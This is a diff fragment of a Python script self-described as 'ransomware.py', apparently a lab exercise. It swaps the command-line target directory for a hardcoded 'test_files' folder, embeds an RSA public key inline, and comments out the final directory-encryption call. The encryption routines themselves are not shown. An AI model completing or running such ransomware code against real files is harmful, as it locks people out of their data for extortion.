@@ -40,31 +40,27 @@ def encrypt_directory(directory, public_key):
 
             encrypt_file(file_path, public_key)
 
+
+
+file_name = os.path.join(os.getcwd(), "test_files")
+
+
+    # # if the directory does not exist, we will exit the program
+if not os.path.exists(file_name):
+    print("Directory does not exist")
+    sys.exit(1)
     
-#We use the directory passed from the command
-directory = sys.argv[1]
-
-#opening the public key file
-with open('publicKey.pem', 'rb') as pub:
-    key = pub.read()
-
-
-# # we will use the command line arguments to get the directory to encrypt
-if len(sys.argv) < 2:
-     print("Usage: python3 ransomware.py <directory>")
-     sys.exit(1)
-
-# # if the directory does not exist, we will exit the program
-if not os.path.exists(directory):
-     print("Directory does not exist")
-     sys.exit(1)
-
-
-#encrypting the directory
-encrypt_directory(directory,key)
+key = """-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCsmkT5Ex06H/Wc5XOefVEe7ZGW
+Do/iCfjef3OQb7tkIzQSOD6A9ndJquJ+RZ/ewMcUkfgJp0uCBnvzyw289d/qg3Dv
+W9YbUfmGvB8l1lyrnP1kGZElZO6Hcq9ZRgior49lQBM71XQkPrixx8UPsuZdZoU1
+jPyV6KQK88WHCFWzyQIDAQAB
+-----END PUBLIC KEY-----"""
 
 
 
+    #encrypting the directory
 
+#encrypt_directory(file_name,key)
 
 
